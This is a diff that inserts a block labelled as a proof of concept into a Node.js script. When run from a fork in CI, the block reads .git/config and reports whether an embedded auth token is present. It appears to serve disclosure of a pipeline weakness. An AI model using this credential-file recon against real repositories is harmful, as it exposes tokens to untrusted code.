@@ -1,6 +1,21 @@
 #!/usr/bin/env node
 import fs from "node:fs";
 import path from "node:path";
+//POC
+import { existsSync, readFileSync } from 'node:fs';
+
+console.log('=== PoC: fork-controlled script executing with working-directory=pr ===');
+console.log('cwd:', process.cwd());
+const gitConfigPath = '.git/config';
+if (existsSync(gitConfigPath)) {
+  const cfg = readFileSync(gitConfigPath, 'utf8');
+  console.log('.git/config exists, length:', cfg.length, 'bytes');
+  console.log('contains embedded auth token (extraheader):', cfg.includes('extraheader'));
+} else {
+  console.log('.git/config not found');
+}
+console.log('=== end PoC recon — original script continues below ===');
+//POC
 
 const REPO_ROOT = process.cwd();
 const SKILLS_ROOT = REPO_ROOT;
